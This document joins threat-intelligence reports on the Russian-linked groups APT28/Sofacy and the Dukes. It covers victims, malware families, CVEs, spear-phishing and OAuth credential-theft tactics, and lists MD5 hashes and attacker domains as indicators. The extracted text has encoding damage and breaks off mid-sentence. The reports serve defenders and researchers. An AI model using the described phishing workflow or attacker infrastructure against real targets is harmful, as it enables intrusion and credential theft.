TABLE 1: APT28 TARGETING OF POLITICAL ENTITIES AND INTRUSION ACTIVITY ENTITY TIMEFRAME APT28 TARGETING AND INTRUSION ACTIVITY OSCE NOVEMBER 2016 The OSCE con˚rmed that it had su˜ered an intrusion, which a Western intelligence service attributed to APT28. 1 Germany's Christian Democratic Union (CDU) APRIL - MAY 2016 Researchers at Trend Micro observed APT28 establish a fake CDU email server and launch phishing emails against CDU members in an attempt to obtain their email credentials and access their accounts. 2,3 Pussy Riot AUGUST 2015 APT28 targets Russian rockers and dissidents Pussy Riot via spear-phishing emails. 4NATO, Afghan Ministry of Foreign A˜airs, Pakistani Military JULY 2015 APT28 used two domains (nato-news.com and bbc-news.org) to host an Adobe Flash zero-day exploit to target NATO, the Afghan Ministry of Foreign A˜airs, and the Pakistani military. German Bundestag & Political Parties JUNE 2015 Germany™s Federal O˛ce for Security in Information Technology (BSI) announced that APT28 was likely responsible for the spear phishing emails sent to members of several German political parties. The head of Germany™s domestic intelligence agency, Bundesamt für Ver -fassungsschutz (BfV), also attributed the June 2015 compromise of the Bundestag™s networks to APT28. 5,6 Kyrgyzstan Ministry of Foreign A˜airs OCTOBER 2014 THROUGH SEPTEMBER 2015 FireEye iSight Intelligence identi˚ed changes made to domain name server (DNS) records that suggest that APT28 intercepted email traf -˚c from the Kyrgyzstan Ministry of Foreign A˜airs after maliciously modifying DNS records of the ministry™s authoritative DNS servers. Polish Government & Power Exchange websites JUNE AND SEPTEMBER 2014 APT28 employed ﬁSedkitﬂ in conjunction with strategic web compro -mises to deliver ﬁSofacyﬂ malware on Polish Government websites, and the websites of Polish energy company Power Exchange. 7 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 5TABLE 2: APT28 NETWORK ACTIVITY HAS LIKELY SUPPORTED INFORMATION OPERATIONS Since 2014, APT28 network activity has likely supported information operations designed to in˚uence the domestic politics of foreign nations. Some of these operations have involved the disruption and defacement of websites, false ˚ag operations using false hacktivist personas, and the theft of data that was later leaked publicly online. Table 2 highlights incidents in which victims su˛ered a compromise that FireEye iSIGHT Intelligence, other authorities, or the victims themselves later attributed to the group we track as APT28. All of these operations have aimed to achieve a similar objective: securing a political outcome bene˜cial to Russia. VICTIM TIMEFRAME APT28 NETWORK ACTIVITY ASSOCIATED INFORMATION OPERATIONS ACTIVITY World Anti-Doping Agency (WADA) SEPTEMBER 2016 On September 13, WADA con˚rmed that APT28 had compromised its networks and accessed athlete medical data. 8 On September 12, 2016, the ﬁFancy Bears™ Hack Teamﬂ persona claimed to have compromised WADA and released athletes™ medical records as ﬁproof of American athletes taking dop -ing.ﬂ 9 U.S. Democratic National Committee (DNC) APRIL Œ SEPTEMBER 2016 The DNC announced it had su˜ered a network compromise and that a subsequent investigation found evidence of two breaches, attributed to APT28 and APT29. FireEye analyzed the mal -ware found on DNC networks and determined that it was consistent with our previous observa -tions of APT28 tools. 10,11 In June 2016, shortly after the DNC™s announcement, the Gu -ccifer 2.0 persona claimed responsibility for the DNC breach and leaked documents taken from the organization™s network. Guccifer 2.0 continued to leak batches of DNC documents through September. 12,13 John Podesta MARCH Œ NOVEMBER 2016 Investigators found that John Podesta, Hillary Clinton™s presidential campaign chairman, was one of thousands of individuals targeted in a mass phishing scheme using shortened URLs that security researchers attributed to APT28. 14 Throughout October and into early November, WikiLeaks pub -lished 34 batches of email correspondence stolen from John Podesta™s personal email account. Correspondence of other individuals targeted in the same phishing campaign, including former Secretary of State Colin Powell and Clinton campaign sta˜er William Rinehart, were published on the ﬁDC Leaksﬂ website. 15 U.S. Democratic Congressional Campaign Committee (DCCC) MARCH - OCTOBER 2016 In July, the DCCC announced that it was investi -gating an ongoing ﬁcybersecurity incidentﬂ that the FBI believed was linked to the compromise of the DNC. House Speaker Nancy Pelosi later con˚rmed that the DCCC had su˜ered a network compromise. Investigators indicated that the actors may have gained access to DCCC systems as early as March. 16,17,18 In August, the Guccifer 2.0 persona contacted reporters cov -ering U.S. House of Representative races to announce newly leaked documents from the DCCC pertaining to Democratic candidates. From August to October, Guccifer 2.0 posted sev -eral additional installments of what appear to be internal DCCC documents on ﬁhisﬂ WordPress site. 19,20 TV5Monde FEBRUARY 2015, APRIL 2015 In February, FireEye identi˚ed CORESHELL tra˛c beaconing from TV5Monde™s network, con˚rming that APT28 had compromised TV -5Monde™s network. In April 2015, alleged pro-ISIS hacktivist group CyberCaliphate defaced TV5Monde™s websites and social media pro˚les and forced the company™s 11 broadcast channels o˝ine. FireEye identi˚ed overlaps between the domain registration details of CyberCaliphate™s website and APT28 infrastructure. 21Ukrainian Central Election Commission (CEC) MAY 2014 Ukrainian o˛cials revealed that the investigation into the compromise of the CEC™s internal net -work identi˚ed malware traced to APT28. 22 During the May 2014 Ukrainian presidential election, purported pro-Russian hacktivists CyberBerkut conducted a series of mali -cious activities against the CEC including a system compromise, data destruction, a data leak, a distributed denial-of-service (DDoS) attack, and an attempted defacement of the CEC web -site with fake election results. 23 8. ﬁWADA Con˜rms Attack by Russian Cyber Espionage Group.ﬂ World Anti-Doping Agency. 13 Sept. 2016.

SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 6FROM OLYMPIC SLIGHT TO DATA LEAK: Investigating APT28 at the World Anti-Doping Agency As news of the DNC breach spread, APT28 was preparing for another set of operations: countering the condemnation that Russia was facing after doping allegations and a threatened blanket ban of the Russian team from the upcoming Rio Games. Russia, like many nations, has long viewed success in the Olympic Games as a source of national prestige and soft power on the world stage. The doping allegations and prospective ban from the Games further ostracized Russia, and likely provided motivation to actively counter the allegations by attempting to discredit anti-doping agencies and policies. Our investigation of APT28™s compromise of WADA™s network, and our observations of the surrounding events reveal how Russia sought to counteract a damaging narrative and delegitimize the institutions leveling criticism. ALLEGATIONS OF RUSSIAN ATHLETES™ WIDESPREAD DOPING NOV (2015) WADA declares the Russian Anti-Doping Agency (RUSADA) non- compliant. 24JULY 18 WADA-commissioned report documents evidence of Russian athletes™ widespread doping. 25AUG 4 Russian athletes were barred from competing in the Olympic Games. 26APT28 COMPROMISES WADA EARLY AUG APT28 sends spear phishing emails to WADA employees. 27AUG 10 APT28 uses a legitimate user account belonging to a Russian athlete to log into WADA™s Anti- Doping Administration and Management System (ADAMS) database. 28AUG 25-SEP 12 APT28 gains access to an International Olympic Committee account created speci˜cally for the 2016 Olympic Games, and views and downloads athlete data. 29 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 7Based on this timeline of leak and threatened leak activity, as well as strikingly similar characteristics and distribution methods shared between @anpoland and ﬁFancy Bears™ Hack Team,ﬂ the same operators are highly likely behind the two personas. WADA o˝cials, citing evidence provided by law enforcement, stated that the threat activity originated in Russia, possibly in retaliation for WADA™s exposure of Russia™s expansive, state-run doping. 38 The statement prompted denials from the Russian Government, with Russian sports minister Vitaly Mutko asking, ﬁHow can you prove that the hackers are Russian?

We further assess that APT28 is the group responsible for the network compromises of WADA and the DNC and other entities related to the 2016 U.S. presidential election cycle. These breaches involved the theft of internal data - mostly emails Œ that was later strategically leaked through multiple forums and propagated in a calculated manner almost certainly intended to advance particular Russian Government aims. In a report released on January 7 2017, the U.S. Directorate of National Intelligence described this activity as an ﬁin˚uence campaign.ﬂ This in˚uence campaign - a combination of network compromises and subsequent data leaks - aligns closely with the Russian military™s publicly stated intentions and capabilities. In˚uence operations, also frequently called ﬁinformation operations,ﬂ have a long history of inclusion in Russian strategic doctrine, and have been intentionally developed, deployed, and modernized with the advent of the internet. The recent activity in the U.S. is but one of many instances of Russian Government in˚uence operations conducted in support of strategic political objectives, and it will not be the last. As the 2017 elections in Europe approach - most notably in Germany, France, and the Netherlands - we are already seeing the makings of similarly concerted e˛orts. CONCLUSION SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 8 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 9In our 2014 report, we identi˜ed APT28 as a suspected Russian government-sponsored espionage actor. We came to this conclusion in part based on forensic details left in the malware that APT28 had employed since at least 2007. We have provided an updated version of those conclusions, a layout of the tactics that they generally employ, as well as observations of apparent tactical shifts. For full details, please reference our 2014 report, APT28: A Window into Russia™s Cyber Espionage Operations ? APT28 employs a suite of malware with features indicative of the group™s plans for continued operations, as well as the group™s access to resources and skilled developers. Key characteristics of APT28™s toolset include: Ł A ˜exible, modular framework that has allowed APT28 to consistently evolve its toolset since at least 2007. Ł Use of a formal coding environment in which to develop tools, allowing the group to create and deploy custom modules within its backdoors. Ł Incorporation of counter-analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis. Ł Code compiled during the normal working day in the Moscow time zone and within a Russian language build environment. OVER 97% OF APT28™S MALWARE SAMPLES WERE COMPILED DURING THE WORKING WEEK 88% OF SAMPLES COMPILED BETWEEN 8AM AND 6PM IN THE TIMEZONE THAT INCLUDES MAJOR RUSSIAN CITIES SUCH AS MOSCOW AND ST. PETERSBURG IN ADDITION, APT28™S DEVELOPERS CONSISTENTLY BUILT MALWARE IN RUSSIAN LANGUAGE SETTINGS UNTIL 2013 APPENDIX: APT28™s Tools, Tactics, and Operational Changes SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 10APT28™S MALWARE SUITE TOOL ROLE AKA CHOPSTICK backdoor Xagent, webhp, SPLM, (.v2 fysbis) EVILTOSS backdoor Sedreco, AZZY, Xagent, ADVSTORESHELL, NETUI GAMEFISH backdoor Sednit, Seduploader, JHUHUGIT, Sofacy SOURFACE downloader Older version of CORESHELL, Sofacy OLDBAIT credential harvester Sas˚s CORESHELL downloader Newer version of SOURFACE, Sofacy APT28™S OPERATIONAL CHANGES SINCE 2014 APT28 continues to evolve its toolkit and re˜ne its tactics in what is almost certainly an e˛ort to protect its operational e˛ectiveness in the face of heightened public exposure and scrutiny. In addition to the continued evolution of the group™s ˜rst stage tools, we have also noted APT28: Ł Leveraging zero-day vulnerabilities in Adobe Flash Player, Java, and Windows, including CVE-2015-1701, CVE-2015-2424, CVE-2015-2590, CVE-2015-3043, CVE-2015-5119, and CVE- 2015-7645. Ł Using a pro˚ling script to deploy zero-days and other tools more selectively, decreasing the chance that researchers and others will gain access to the group™s tools. Ł Increasing reliance on public code depositories , such as Carberp, PowerShell Empire, P.A.S. webshell, Metasploit modules, and others in a likely e˛ort to accelerate their development cycle and provide plausible deniability. Ł Obtaining credentials through fabricated Google App authorization and Oauth access requests that allow the group to bypass two-factor authentication and other security measures. Ł Moving laterally through a network relying only on legitimate tools that already exist within the victims™ systems, at times forgoing their traditional toolset for the duration of the compromise. These changes are not only indicative of APT28™s skills, resourcefulness, and desire to maintain operational e˛ectiveness, but also highlight the longevity of the group™s mission and its intent to continue its activities for the foreseeable future. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 11APT28 TACTICS We have observed APT28 rely on four key tactics when attempting to compromise intended targets. These include sending spear-phishing emails that either deliver exploit documents that deploy malware onto a user™s systems, or contain a malicious URL designed to harvest the recipients™ email credentials and provide access to the their accounts. APT28 has also compromised and placed malware on legitimate websites intending to infect site visitors, and has gained access to organizations by compromising their web-facing servers .APT28 IS IN YOUR NETWORK. Victim goes to link and retrieves malicious document or is served a web-based exploit that installs malware. (Flash Vulnerability CVE- 2016-7855 and Windows Vulnerability CVE-2016-7255 were exploited as zero days to install malware on victims who visited a malicious URL). Victim opens document, and malware is installed by exploiting a vulnerability (e.g., ARM-NATO_ ENGLISH_30_NOV_2016. doc leveraged an Adobe Flash exploit, CVE-2016-7855, to install GAMEFISH targeted machine). TACTIC Craft exploit document with enticing lure content. Send exploit document to victim. Send link mirroring structure of legitimate organization™s site that is designed to expire once users clickit. Register a domain spoo˜ng that of a legitimate organization (e.g., theguardiannews.org). INFECTION WITH MALWARE VIA SPEAR PHISH Person is asked to authorize application to view mail and gives access. APT28 leverages OAuth privileges given to malicious application to read email. Recipient visits fake login page and enters credentials. APT28 uses stolen credentials to access mailbox and read email. Register a domain spoo˜ng a webmail service or an organization™s webmail portal (e.g., 0nedrive-0˝ce365.com) Send email to targets instructing them to reset their passwords. Send email to victims warning of security risk and asking them to enable security service. TACTIC WEBMAIL ACCESS VIA SPEAR-PHISH SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 12APT28 IS IN YOUR NETWORK. Users of the site are redirected using malicious iFrame and pro˜led (e.g, this technique was used to compromise and infect visitors to numerous Polish Government websites in 2014).

Sofacy Activity\\nBy GReAT\\non February 20, 2018. 2:00 pm\\nSofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year.\\nThis high level of cyber-espionage activity goes back years. In 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point.\\nIn 2013, the Sofacy group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others. We’ve seen quite a few versions of these implants, which were relatively widespread at some point or still are. In 2015 we noticed another wave of attacks which took advantage of a new release of the AZZY implant, largely undetected by antivirus products. The new wave of attacks included a new generation of USB stealers deployed by Sofacy, with initial versions dating to February 2015. It appeared to be geared exclusively towards high profile targets.\\nSofacy’s reported presence in the DNC network alongside APT29 brought possibly the highest level of public attention to the group’s activities in 2016, especially when data from the compromise was leaked and “weaponized”. And later 2016, their focus turned towards the Olympics’ and the World Anti-Doping Agency (WADA) and Court of Arbitration for Sports (CAS), when individuals and servers in these organizations were phished and compromised. In a similar vein with past CyberBerkut activity, attackers hid behind anonymous activist groups like “anonpoland”, and data from victimized organizations were similarly leaked and “weaponized”.\\nThis write-up will survey notables in the past year of 2017 Sofacy activity, including their targeting, technology, and notes on their infrastructure. No one research group has 100% global visibility, and our collected data is presented accordingly. Here, external APT28 reports on 2017 Darkhotel-style activity in Europe and Dealer’s Choice spearphishing are of interest. From where we sit, 2017 Sofacy activity starts with a heavy focus on NATO and Ukrainian partners, coinciding with lighter interest in Central Asian targets, and finishing the second half of the year with a heavy focus on Central Asian targets and some shift further East.\\nDealer’s Choice\\nThe beginning of 2017 began with a slow cleanup following the Dealer’s Choice campaign, with technical characteristics documented by our colleagues at Palo Alto in several stages at the end of 2016. The group spearphished targets in several waves with Flash exploits leading to their carberp based JHUHUGIT downloaders and further stages of malware. It seems that many folks did not log in and pull down their emails until Jan 2017 to retrieve the Dealer’s Choice spearphish. Throughout these waves, we observed that the targets provided connection, even tangential, to Ukraine and NATO military and diplomatic interests.\\nIn multiple cases, Sofacy spoofs the identity of a target, and emails a spearphish to other targets of interest. Often these are military or military-technology and manufacturing related, and here, the DealersChoice spearphish is again NATO related:\\nThe global reach that coincided with this focus on NATO and the Ukraine couldn’t be overstated. Our KSN data showed spearphishing targets geolocated across the globe into 2017.\\nAM, AZ, FR, DE, IQ, IT, KG, MA, CH, UA, US, VN\\nDealersChoice emails, like the one above, that we were able to recover from third party sources provided additional targeting insight, and confirmed some of the targeting within our KSN data:\\nTR, PL, BA, AZ, KR, LV, GE, LV, AU, SE, BE\\n0day Deployment(s)\\nSofacy kicked off the year deploying two 0day in a spearphish document, both a Microsoft Office encapsulated postscript type confusion exploit (abusing CVE-2017-0262) and an escalation of privilege use-after-free exploit (abusing CVE-2017-0263). The group attempted to deploy this spearphish attachment to push a small 30kb backdoor known as GAMEFISH to targets in Europe at the beginning of 2017. They took advantage of the Syrian military conflict for thematic content and file naming “Trump’s_Attack_on_Syria_English.docx”. Again, this deployment was likely a part of their focus on NATO targets.\\nLight SPLM deployment in Central Asia and Consistent Infrastructure\\nMeanwhile in early-to-mid 2017, SPLM/CHOPSTICK/XAgent detections in Central Asia provided a glimpse into ongoing focus on ex-Soviet republics in Central Asia. These particular detections are interesting because they indicate an attempted selective 2nd stage deployment of a backdoor maintaining filestealer, keylogger, and remoteshell functionality to a system of interest. As the latest revision of the backdoor, portions of SPLM didn’t match previous reports on SPLM/XAgent while other similarities were maintained. SPLM 64-bit modules already appeared to be at version 4 of the software by May of the year. Targeting profiles included defense related commercial and military organizations, and telecommunications.\\nTargeting included TR, KZ, AM, KG, JO, UK, UZ\\nHeavy Zebrocy deployments\\nSince mid-November 2015, the threat actor referred to as “Sofacy” or “APT28” has been utilizing a unique payload and delivery mechanism written in Delphi and AutoIT. We collectively refer to this package and related activity as “Zebrocy” and had written a few reports on its usage and development by June 2017 – Sofacy developers modified and redeployed incremented versions of the malware. The Zebrocy chain follows a pattern: spearphish attachment -> compiled Autoit script (downloader) -> Zebrocy payload. In some deployments, we observed Sofacy actively developing and deploying a new package to a much smaller, specific subset of targets within the broader set.\\nTargeting profiles, spearphish filenames, and lures carry thematic content related to visa applications and scanned images, border control administration, and various administrative notes. Targeting appears to be widely spread across the Middle East, Europe, and Asia:\\nBusiness accounting practices and standards\\nScience and engineering centers\\nIndustrial and hydrochemical engineering and standards/certification\\nMinistry of foreign affairs\\nEmbassies and consulates\\nNational security and intelligence agencies\\nPress services\\nTranslation services\\nNGO – family and social service\\nMinistry of energy and industry\\nWe identified new MSIL components deployed by Zebrocy. While recent Zebrocy versioning was 7.1, some of the related Zebrocy modules that drop file-stealing MSIL modules we call Covfacy were v7.0. The components were an unexpected inclusion in this particular toolset. For example, one sent out to a handful of countries identifies network drives when they are added to target systems, and then RC4-like-encrypts and writes certain file metadata and contents to a local path for later exfiltration. The stealer searches for files 60mb and less with these extensions:\\n.doc\\n.docx\\n.xls\\n.xlsx\\n.ppt\\n.pptx\\n.exe\\n.zip\\n.rar\\nAt execution, it installs an application-defined Windows hook. The hook gets windows messages indicating when a network drive has been attached. Upon adding a network drive, the hook calls its “RecordToFile” file stealer method.\\nZebrocy spearphishing targets:\\nAF, AM, AU, AZ, BD, BE, CN, DE, ES, FI, GE, IL, IN, JO, KW, KG, KZ, LB, LT, MN, MY, NL, OM, PK, PO, SA, ZA, SK, SE, CH, TJ, TM, TR, UA, UAE, UK, US, UZ\\nSPLM deployment in Central Asia\\nSPLM/CHOPSTICK components deployed throughout 2017 were native 64-bit modular C++ Windows COM backdoors supporting http over fully encrypted TLSv1 and TLSv1.2 communications, mostly deployed in the second half of 2017 by Sofacy. Earlier SPLM activity deployed 32-bit modules over unencrypted http (and sometimes smtp) sessions. In 2016 we saw fully functional, very large SPLM/X-Agent modules supporting OS X.\\nThe executable module continues to be part of a framework supporting various internal and external components communicating over internal and external channels, maintaining slightly morphed encryption and functionality per deployment. Sofacy selectively used SPLM/CHOPSTICK modules as second stage implants to high interest targets for years now. In a change from previous compilations, the module was structured and used to inject remote shell, keylogger, and filesystem add-ons into processes running on victim systems and maintaining functionality that was originally present within the main module.\\nThe newer SPLM modules are deployed mostly to Central Asian based targets that may have a tie to NATO in some form. These targets include foreign affairs government organizations both localized and abroad, and defense organizations’ presence localized, located in Europe and also located in Afghanistan. One outlier SPLM target profile within our visibility includes an audit and consulting firm in Bosnia and Herzegovina.\\nMinor changes and updates to the code were released with these deployments, including a new mutex format and the exclusive use of encrypted HTTP communications over TLS. The compiled code itself already is altered per deployment in multiple subtle ways, in order to stymie identification and automated analysis and accommodate targeted environments. Strings (c2 domains and functionality, error messages, etc) are custom encrypted per deployment.\\nTargets: TR, KZ, BA, TM, AF, DE, LT, NL\\nSPLM/CHOPSTICK/XAgent Modularity and Infrastructure\\nThis subset of SPLM/CHOPSTICK activity leads into several small surprises that take us into 2018, to be discussed in further detail at SAS 2018. The group demonstrates malleability and innovation in maintaining and producing familiar SPLM functionality, but the pragmatic and systematic approach towards producing undetected or difficult-to-detect malware continues. Changes in the second stage SPLM backdoor are refined, making the code reliably modular.\\nInfrastructure Notes\\nSofacy set up and maintained multiple servers and c2 for varying durations, registering fairly recognizable domains with privacy services, registrars that accept bitcoin, fake phone numbers, phony individual names, and 1 to 1 email address to domain registration relationships. Some of this activity and patterns were publicly disclosed, so we expect to see more change in their process in 2018. Also, throughout the year and in previous years, researchers began to comment publicly on Sofacy’s fairly consistent infrastructure setup.\\nAs always, attackers make mistakes and give away hints about what providers and registrars they prefer. It’s interesting to note that this version of SPLM implements communications that are fully encrypted over HTTPS. As an example, we might see extraneous data in their SSL/TLS certificates that give away information about their provider or resources. Leading up to summer 2017, infrastructure mostly was created with PDR and Internet Domain Service BS Corp, and their resellers. Hosting mostly was provided at Fast Serv Inc and resellers, in all likelihood related to bitcoin payment processing.\\nAccordingly, the server side certificates appear to be generated locally on VPS hosts that exclusively are paid for at providers with bitcoin merchant processing. One certificate was generated locally on what appeared to be a HP-UX box, and another was generated on “8569985.securefastserver.com” with an email address “root@8569985.securefastserver.com”, as seen here for their nethostnet.com domain. This certificate configuration is ignored by the malware.\\nIn addition to other ip data, this data point suggested that Qhoster at https://www.qhoster.com was a VPS hosting reseller of choice at the time. It should be noted that the reseller accepted Alfa Click, PayPal, Payza, Neteller, Skrill, WebMoney, Perfect Money, Bitcoin, Litecoin, SolidTrust Pay, CashU, Ukash, OKPAY, EgoPay, paysafecard, Alipay, MG, Western Union, SOFORT Banking, QIWI, Bank transfer for payment.\\nConclusion\\nSofacy, one of the most active APT we monitor, continues to spearphish their way into targets, reportedly widely phishes for credentials, and infrequently participates in server side activity (including host compromise with BeEF deployment, for example). KSN visibility and detections suggests a shift from their early 2017 high volume NATO spearphish targeting towards the middle east and Central Asia, and finally moving their focus further east into late 2017. Their operational security is good. Their campaigns appear to have broken out into subsets of activity and malware involving GAMEFISH, Zebrocy, and SPLM, to name a few. Their evolving and modified SPLM/CHOPSTICK/XAgent code is a long-standing part of Sofacy activity, however much of it is changing. We’ll cover more recent 2018 change in their targeting and the malware itself at SAS 2018.\\nWith a group like Sofacy, once their attention is detected on a network, it is important to review logins and unusual administrator access on systems, thoroughly scan and sandbox incoming attachments, and maintain two factor authentication for services like email and vpn access. In order to identify their presence, not only can you gain valuable insight into their targeting from intelligence reports and gain powerful means of detections with hunting tools like YARA, but out-of-band processing with a solution like KATA is important.\\nTechnical Appendix\\nRelated md5\\n8f9f697aa6697acee70336f66f295837\\n1a4b9a6b321da199aa6d10180e889313\\n842454b48f5f800029946b1555fba7fc\\nd4a5d44184333442f5015699c2b8af28\\n1421419d1be31f1f9ea60e8ed87277db\\nb1d1a2c64474d2f6e7a5db71ccbafa31\\n953c7321c4959655fdd53302550ce02d\\n57601d717fcf358220340675f8d63c8a\\n02b79c468c38c4312429a499fa4f6c81\\n85cd38f9e2c9397a18013a8921841a04\\nf8e92d8b5488ea76c40601c8f1a08790\\n66b4fb539806ce27be184b6735584339\\ne8e1fcf757fe06be13bead43eaa1338c\\n953c7321c4959655fdd53302550ce02d\\naa2aac4606405d61c7e53140d35d7671\\n85cd38f9e2c9397a18013a8921841a04\\n57601d717fcf358220340675f8d63c8a\\n16e1ca26bc66e30bfa52f8a08846613d\\nf8e92d8b5488ea76c40601c8f1a08790\\nb137c809e3bf11f2f5d867a6f4215f95\\n237e6dcbc6af50ef5f5211818522c463\\n88009adca35560810ec220544e4fb6aa\\n2163a33330ae5786d3e984db09b2d9d2\\n02b79c468c38c4312429a499fa4f6c81\\n842454b48f5f800029946b1555fba7fc\\nd4a5d44184333442f5015699c2b8af28\\nb88633376fbb144971dcb503f72fd192\\n8f9f697aa6697acee70336f66f295837\\nb6f77273cbde76896a36e32b0c0540e1\\n1a4b9a6b321da199aa6d10180e889313\\n1421419d1be31f1f9ea60e8ed87277db\\n1a4b9a6b321da199aa6d10180e889313\\n9b10685b774a783eabfecdb6119a8aa3\\naa34fb2e5849bff4144a1c98a8158970\\naced5525ba0d4f44ffd01c4db2730a34\\nb1d1a2c64474d2f6e7a5db71ccbafa31\\nb924ff83d9120d934bb49a7a2e3c4292\\ncdb58c2999eeda58a9d0c70f910d1195\\nd4a5d44184333442f5015699c2b8af28\\nd6f2bf2066e053e58fe8bcd39cb2e9ad\\n34dc9a69f33ba93e631cd5048d9f2624\\n1c6f8eba504f2f429abf362626545c79\\n139c9ac0776804714ebe8b8d35a04641\\ne228cd74103dc069663bb87d4f22d7d5\\nbed5bc0a8aae2662ea5d2484f80c1760\\n8c3f5f1fff999bc783062dd50357be79\\n5882a8dd4446abd137c05d2451b85fea\\n296c956fe429cedd1b64b78e66797122\\n82f06d7157dd28a75f1fbb47728aea25\\n9a975e0ddd32c0deef1318c485358b20\\n529424eae07677834a770aaa431e6c54\\n4cafde8fa7d9e67194d4edd4f2adb92b\\nf6b2ef4daf1b78802548d3e6d4de7ba7\\nede5d82bb6775a9b1659dccb699fadcb\\n116d2fc1665ce7524826a624be0ded1c\\n20ff290b8393f006eaf4358f09f13e99\\n4b02dfdfd44df3c88b0ca8c2327843a4\\nc789ec7537e300411d523aef74407a5e\\n0b32e65caf653d77cab2a866ee2d9dbc\\n27faa10d1bec1a25f66e88645c695016\\n647edddf61954822ddb7ab3341f9a6c5\\n2f04b8eb993ca4a3d98607824a10acfb\\n9fe3a0fb3304d749aeed2c3e2e5787eb\\n62deab0e5d61d6bf9e0ba83d9e1d7e2b\\n86b607fe63c76b3d808f84969cb1a781\\nf62182cf0ab94b3c97b0261547dfc6cf\\n504182aaa5575bb38bf584839beb6d51\\nd79a21970cad03e22440ea66bd85931f\\nRelated domains\\nnethostnet.com\\nhostsvcnet.com\\netcrem.net\\nmovieultimate.com\\nnewfilmts.com\\nfastdataexchange.org\\nliveweatherview.com\\nanalyticsbar.org\\nanalyticstest.net\\nlifeofmentalservice.com\\nmeteost.com\\nrighttopregnantpower.com\\nkiteim.org\\nadobe-flash-updates.org\\ngeneralsecurityscan.com\\nglobalresearching.org\\nlvueton.com\\naudiwheel.com\\nonline-reggi.com\\nfsportal.net\\nnetcorpscanprotect.com\\nmvband.net\\nmvtband.net\\nviters.org\\ntreepastwillingmoment.com\\nsendmevideo.org\\nsatellitedeluxpanorama.com\\nppcodecs.com\\nencoder-info.tk\\nwmdmediacodecs.com\\npostlkwarn.com\\nshcserv.com\\nversiontask.com\\nwebcdelivery.com\\nmiropc.org\\nsecurityprotectingcorp.com\\nuniquecorpind.com\\nappexsrv.net\\nadobeupgradeflash.com\\nAPT Backdoor Cyber espionage Nation State Sponsored Espionage Sofacy Targeted Attacks Vulnerabilities and exploits Zero-day vulnerabilities\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nOperation AppleJeus Sequel\\nOilRig’s Poison Frog – old samples, same trick\\nKaspersky Security Bulletin 2019.

      "\"THE DUKES 7 years of Russian cyberespionage This whitepaper explores the tools - such as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, etc- of the Dukes , a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making.

The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. Their targets have also included the governments of members of the Commonwealth of Independent States; Asian, African, and Middle Eastern governments; organizations associated with Chechen extremism; and Russian speakers engaged in the illicit trade of controlled substances and drugs. The Dukes are known to employ a vast arsenal of malware toolsets, which we identify as MiniDuke , CosmicDuke , OnionDuke , CozyDuke , CloudDuke , SeaDuke , HammerDuke , PinchDuke , and GeminiDuke . In recent years, the Dukes have engaged in apparently biannual large-scale spear-phishing campaigns against hundreds or even thousands of recipients associated with governmental institutions and a˚liated organizations. These campaigns utilize a smash-and-grab approach involving a fast but noisy break- in followed by the rapid collection and ex˛ltration of as much data as possible. If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering. In addition to these large-scale campaigns, the Dukes continuously and concurrently engage in smaller, much more targeted campaigns, utilizing di˝erent toolsets. These targeted campaigns have been going on for at least 7 years. The targets and timing of these campaigns appear to align with the known foreign and security policy interests of the Russian Federation at those times. The Dukes rapidly react to research being published about their toolsets and operations. However, the group (or their sponsors) value their operations so highly that though they will attempt to modify their tools to evade detection and regain stealth, they will not cease operations to do so, but will instead incrementally modify their tools while continuing apparently as previously planned. In some of the most extreme cases, the Dukes have been known to engage in campaigns with unaltered versions of tools that only days earlier have been brought to the public™s attention by security companies and actively mentioned in the media. In doing so, the Dukes show unusual con˛dence in their ability to continue successfully compromising their targets even when their tools have been publicly exposed, as well as in their ability to operate with impunity. 4THE STORY OF THE DUKES 2008: Chechnya The earliest activity we have been able to de˜nitively attribute to the Dukes are two PinchDuke campaigns from November 2008. These campaigns use PinchDuke samples that were, according to their compilation timestamps, created on the 5 th and 12th of November 2008. The campaign identi˜ers found in these two samples are respectively, ﬁ alkavkaz.com20081105 ﬂ and ﬁcihaderi.net20081112 ﬂ.The ˜rst campaign identi˜er, found in the sample compiled on the 5 th, references alkavkaz.com , a domain associated with a Turkish website proclaiming to be the ﬁChechan sic Informational Centerﬂ (image 1, page 5). The second campaign identi˜er, from the sample compiled on the 12 th, references cihaderi.net , another Turkish website that claims to provide ﬁnews from the jihad worldﬂ and which dedicates a section of its site to Chechnya. Due to a lack of other PinchDuke samples from 2008 or earlier, we are unable to estimate when the Duke operation originally began. Based on our technical analysis of the known PinchDuke samples from 2008 however, we believe PinchDuke to have been under development by the summer of 2008. In fact, we believe that by the autumn of 2008, the Dukes were already developing not one but at least two distinct malware toolsets. This assertion is based on the oldest currently known sample of another Duke-related toolset, GeminiDuke , which was compiled on the 26 th of January 2009. This sample, like the early PinchDuke samples, appears to already be a ﬁfully-grownﬂ sample, which is why we believe GeminiDuke was under development by the autumn of 2008. That the Dukes were already developing and operating at least two distinct malware toolsets by the second half of 